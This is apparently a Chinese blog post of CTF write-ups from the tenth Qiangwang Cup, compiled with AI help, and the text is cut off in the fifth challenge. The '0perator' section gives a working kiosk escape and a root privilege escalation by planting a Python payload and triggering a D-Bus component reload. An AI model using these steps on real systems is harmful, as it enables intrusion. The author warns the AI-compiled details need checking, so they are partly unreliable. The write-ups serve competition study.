---
title: 第十届强网杯参赛有感（附题目附件）
url: https://mp.weixin.qq.com/s/J55DnxBuWtl6FvpdmROEkA
source: Doonsec's feed
date: 2026-11-07
fetch_date: 2026-11-08T08:09:23.380082
---

# 第十届强网杯参赛有感（附题目附件）

# 第十届强网杯参赛有感（附题目附件）

原创

EuSRC安全实验室
EuSRC安全实验室

EuSRC安全实验室

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

昨天偶然刷到 Nu1L 那篇《关于暂停 N1CTF 的决定》 突然意识到从"古法CTF"，到今年 Agent 开始主导解题，也就这三年。

这里附上部分题目的 WP，这次解题大多有 AI 辅助，所以下面这些 WP 也是 AI 整理的，建议想要研究的师傅们对着题目附件再核实一下~

### 1. 宇宙微波背景辐射（Misc）

**题目信息**：附件为 631 MB 的 MKV 容器。`ffprobe` 解析结果为五类载体：

```
Stream #0:0  Video       主视频（结尾约 8 秒为雪花）
Stream #0:1  Video       隐藏视频轨（整段雪花，400 帧）
Stream #0:2  Audio       干扰项
Stream #0:3  Subtitle    SubRip 字幕（200 条正文，十六进制）
Attachment   g2.tar      200 张 PNG
Attachment   g4.tar      200 张 PNG
```

**解题过程**：

1. **拆容器**。MKV 底层为 EBML 元素树，音视频/字幕轨位于 `Tracks`，附件位于 `Attachments`，因此取法不同：

   ```
   ffmpeg -y -i challenge.mkv -map 0:1 -c copy hidden.mkv
   ffmpeg -y -i challenge.mkv -map 0:s:0 hidden.srt
   ffmpeg -y -dump_attachment:t "" -i challenge.mkv
   ```

   `-c copy` 只搬运已编码 packet，不重新编码，保证 400 帧的帧序与像素值不变——这对「相邻帧是否相同」的统计是前提条件。
2. **六段素材**：隐藏轨按 `[0:200]`、`[200:400]` 切分为两段；字幕正文去掉非 `[0-9a-f]` 字符后 `bytes.fromhex()` 再 `cv2.imdecode` 还原 200 张 PNG；主视频按 `start = total - round(fps * 8)` 定位尾段（25 fps 时约 200 帧）；两个 tar 解包后各 200 张。合计 600 张 960×540 图像。
3. **单帧统计无效**。图像直方图仅含 8 与 242 两个值，逐像素求平均 `std ≈ 4.78`（纯噪声理论值 4.9），分半相关约 0.001，2D FFT、块均值/块方差均与 iid 二值噪声一致，说明文本未以亮度或空间结构编码。
4. **时间稳定性编码**。每段 200 帧中，背景噪声逐帧重新随机：同一坐标在相邻两帧取相同值的概率约 0.5；文字覆盖像素逐帧复制同一份噪声，相邻帧同值概率接近 1。逐像素伯努利检验：

   ```
   score[y,x] = (1/(N-1)) * Σ_t [ B_t[y,x] == B_{t-1}[y,x] ]
   ```

   以阈值 125 将每帧压为 0/1 位图（雪花灰度铺满 0–255，125 落在直方图谷底附近），统计 199 次相邻帧比较的同值比例，背景期望 0.5，文字区显著高于 0.5。
5. **平滑与拉伸**。零假设下单像素标准差 `0.5/sqrt(199) ≈ 0.035`，文字区 p≈0.55 时仅约 1.4σ，需借助空间连通性：

* `cv2.GaussianBlur(score, (0,0), 2)`，等效约 9×9 邻域平均，噪声标准差降至千分之几；
* `np.clip((smooth - 0.49) * 2200, 0, 255)`，以 0.49 为基线压暗背景、增益放大 0.01 级差异；
* `clip` 必须先于 `astype(np.uint8)`，否则负值回绕成 255。

6. **重排与拼接**。六段按存放位置编号 part0–part5，按语义顺序 `[0,1,4,3,2,5]` 重排（隐藏轨前半、g2、字幕、g4、隐藏轨后半、主视频尾段），横向拼接前按最小高度裁齐：

   ```
   f1ag{S | 3cr3t_ | 0f_cM6_ | h1dd3n_ | 1n51d3_ | 5tr34m}
   ```

   首段以数字 `1` 冒充字母 `l`，提交时仅替换第一处前缀为 `flag{`。

### 2. 0perator（Misc）

**题目信息**：目标为 VNC 远程桌面（`nc` 连接后返回 `RFB 003.008`），题目描述为酒店大堂自助入住机，flag 位于 `/root/flag.txt`。

**解题过程**：

1. **入口确认**：VNC 密码 `123qwe123`，连接后为 Chromium kiosk 模式的自助入住机（标题 `Qiangwang Cup Hotel · SELF CHECK-IN · POWERED BY 0PERATOR`，设备编号 `KIOSK-07`），后端为 Flask（kiosk 用户）与 root 设备管理器（D-Bus）。
2. **TOTP 种子泄漏**：首屏「手机动态码验证」直接绘制绑定二维码。对 VNC 画面截图后用 `cv2.QRCodeDetector().detectAndDecode` 解码，得到：

   ```
   otpauth://totp/0perator:KIOSK-07?secret=ULPYXTUIZVJZQRJVWGM2MISRTLZGJTEF&issuer=0perator
   ```

   TOTP 为对称凭证，种子即密钥，可在本地按 HMAC-SHA1 / 30 秒 / 6 位生成动态码，服务端仅做数值比对。
3. **kiosk 逃逸**：启动脚本 `/opt/0perator/scripts/start-kiosk.sh` 以黑名单中和部分 XFCE 全局快捷键：

   ```
   <Primary><Alt>t        <Alt>F2        <Primary><Alt>Delete        <Super>
   ```

   遗漏 `<Super>e`（Thunar）。按下后弹出文件管理器（kiosk 身份，可浏览根文件系统），右键「Open Terminal Here」打开 xfce4-terminal，取得 kiosk shell（`id` 返回 `uid=1000(kiosk)`）。
4. **环境与缺陷确认**：80 端口 `GUEST SUPPORT` 页面提供 `/downloads/0perator-diag.zip`，其中 `field-service.md` 说明「覆盖目录 `/var/lib/0perator/components/user` 对 kiosk 可写、覆盖仅在厂商组件降级时生效」。结合 `/opt/0perator/device_manager/manager.py` 与 `component_loader.py`，确认四项缺陷：

* 覆盖目录 `drwxr-xr-x kiosk kiosk`，kiosk 可写；
* python 组件验签 `verify_manifest(..., include_sha256=False)`，仅校验清单字段、不绑定 `entry` 文件内容（native 组件 `include_sha256=True`，故对 `printer-driver` 无效）；
* 降级开关 `/run/0perator/face.status` 位于 kiosk 可写目录，内容为 `disabled` 时走 `user-override` 分支；
* D-Bus 策略允许 `user="kiosk"` 调用 `ReloadComponents`，无鉴权。

5. **利用**：复制厂商已签名清单，部署同名 `entry` 载荷，翻转降级开关并触发重载：

   ```
   mkdir -p /var/lib/0perator/components/user/face-recognition
   cp /usr/share/0perator/components/face/manifest.json \
      /var/lib/0perator/components/user/face-recognition/manifest.json
   cat > /var/lib/0perator/components/user/face-recognition/face.py <<'PY'
   import os
   os.system("cp /root/flag.txt /home/kiosk/flag.txt; chmod 644 /home/kiosk/flag.txt; id > /home/kiosk/pwn.txt")
   def on_load(ctx):
       return None
   PY
   mkdir -p /run/0perator
   printf 'disabled' > /run/0perator/face.status
   dbus-send --system --print-reply --dest=org.operator.DeviceManager \
     /org/operator/DeviceManager org.operator.DeviceManager1.ReloadComponents
   ```

   加载由 `importlib` 完成，模块顶层代码在导入时即执行；进程身份为 root，故载荷以 root 权限运行。返回 JSON 中 `face-recognition` 的 `source` 为 `user-override`，`failures` 为空（清单验签通过），`printer-driver` 仍为 `vendor` 且带 `sha256`。
6. **读取结果**：`cat /home/kiosk/pwn.txt` 返回 `uid=0(root)`，`/home/kiosk/flag.txt` 为 flag。

### 3. NeuronShuffle（Misc）

**题目信息**：附件 `check.py`、`model_A.npz`、`model_B.bin`。`model_A.npz` 可正常加载，包含 8 个数组：

| 数组 | 形状 | 作用 |
| --- | --- | --- |
| `k0` | (16,) | 第 2 层偏置 |
| `k1` | (16,32) | 32→16 权重 |
| `k2` | (40,48) | 48→40 权重 |
| `k3` | (48,) | 第 1 层偏置 |
| `k4` | (40,) | 第 3 层偏置 |
| `k5` | (48,32) | 32→48 权重 |
| `k6` | (32,40) | 40→32 权重 |
| `k7` | (32,) | 输出层偏置 |

网络拓扑为 32→48→40→32→16，隐层宽度 48/40/32 即后续置换参数。`model_B.bin` 为等长黑盒副本（前 16 字节为摘要形式，字节分布近均匀），无法直接解析，属于干扰项。

**解题过程**：

1. **校验器分析**：`check.py` 输入为三组以 `;` 分隔、组内以 `,` 分隔的整数，规范化后做两级哈希：

   ```
   V = "cf8303ef7e9fc6f51baf27b6e2c8763bd199a0a24c5294bcdaca3ddef6e47864"
   canon = ";".join(",".join(str(int(v)) for v in s.split(",")) for s in text.strip().split(";"))
   body  = hashlib.sha256(canon.encode()).hexdigest()[:32]
   assert hashlib.sha256(("ns::" + body).encode()).hexdigest() == V
   print(f"[+] correct! flag = flag{{{body}}}")
   ```

   flag 即 `body`，无法爆破，必须真正还原出正确的索引序列。
2. **统计异常**：8 个数组共 5384 个 `float64`，去重后仅 926 个唯一值。若权重为逐层独立采样，上千个连续分布随机数几乎不可能出现如此高的重复率，故权重来自一个候选池并按索引取用。
3. **PRNG 复现**：

   ```
   import numpy as np
   samples = np.random.default_rng(20261101).normal(0, 0.6, 974)
   # 974 个样本覆盖全部 926 个唯一值；k5[0] 与 samples[:32] 逐位相等
   assert np.array_equal(k5[0], samples[:32])
   ```

   种子为日期 `20261101`，池长 974 为覆盖全部权重的下界（最后一个被用到的值位于下标 973）。
4. **索引还原**：用同一 PRNG 重建样本序列，将每个权重反查为序列下标；按三个隐层宽度 48/40/32 分别构造置换，还原为三组整数，按 `a;b;c` 提交并通过两级哈希。

### 4. Dreambound（Misc）

**题目信息**：附件 `checkpoint.pt`（4,245,557 字节）、`model.py`（1,715 字节）、`requirements.txt`。模型结构：

```
OBS_DIM, ACT_DIM, H_DIM = 4, 5, 384
class WorldModel(nn.Module):
    def __init__(self):
        self.gru         = nn.GRUCell(act_dim, h_dim)              # 5 -> 384
        self.decoder     = Sequential(Linear(384,256), ReLU(), Linear(256,4))
        self.reward_head = Sequential(Linear(384,512), ReLU(), Linear(512,512), ReLU(), Linear(512,1))
        self.continue_head = Sequential(Linear(384,128), ReLU(), Linear(128,1))
```

总参数量 1,059,718。解码与 continue 头未被服务端使用，实际参与打分的是 GRU 与 reward\_head。

**解题过程**：

1. **协议探测**：服务端非 HTTP，而是裸 TCP 按行读取的一行 JSON。发送 `{"actions":[48 ints]}\n` 返回 `{"ok":true,"score":...}`；带 HTTP 头时首行解析失败，统一返回 `bad submission`。
2. **打分函数确认**：本地用 `imagine()` 复现，`score` 等于 48 步 reward 之和：

   ```
   @torch.no_grad()
   def imagine(model, actions):
       h = model.initial(actions.shape[0], actions.device)
       rewards = []
       for t in range(actions.shape[1]):
           h = model.step(h, F.one_hot(actions[:, t], model.act_dim).float())
           rewards.append(model.predict_reward(h))
       return torch.stack(rewards, dim=1)
   ```

   以全 1 序列做指纹：本地 `r.sum() = -63.121872`，服务端返回 `-63.1219`，四位小数一致，确认打分函数。
3. **常量基线**：全 0 为 7.146025、全 1 为 -63.121872、全 2 为 -208.885254、全 3 为 24.797272、全 4 为 170.508408。全 4 仍未触发 flag，说明阈值高于 170.5；搜索空间 `5^48 ≈ 2.8×10^33`，无法暴力。
4. **梯度法失败**：采用 straight-through Gumbel-softmax 连续松弛，600 步多随机种子，最优离散结果仅 28.26（低于全 4 基线）。原因：GRU 逐时间步递推，软输入与 one-hot 轨迹差异大；reward 对单个动作非常敏感，软松弛抹平了尖锐性。
5. **批量离散搜索**：

   ```
   @torch.no_grad()
   def batch_score(seqs):            # (B, 48) -> (B,)
       B = seqs.shape[0]
       h = torch.zeros(B, 384)
       total = torch.zeros(B)
       for t in range(48):
           h = model.gru(F.one_hot(seqs[:, t], 5).float(), h)
           total += model.reward_head(h).squeeze(-1)
       return total
   ```

   坐标下降：固定其余 47 步，枚举第 t 步 5 种取值，一轮评估 192 条；收敛后外层做随机双点扰动（30 轮）跳出局部最优。
6. **收敛结果**：最终序列将 GRU 隐状态推离训练分布，单步 reward 峰值 564，48 步累计 1290，超过服务端阈值。该序列对单点扰动敏感（修改一个动作可导致分数显著下降），验证了模型处于分布外区域。

### 5. 谍影重重7（Misc）

**题目信息**：无附件，容器按六问逐...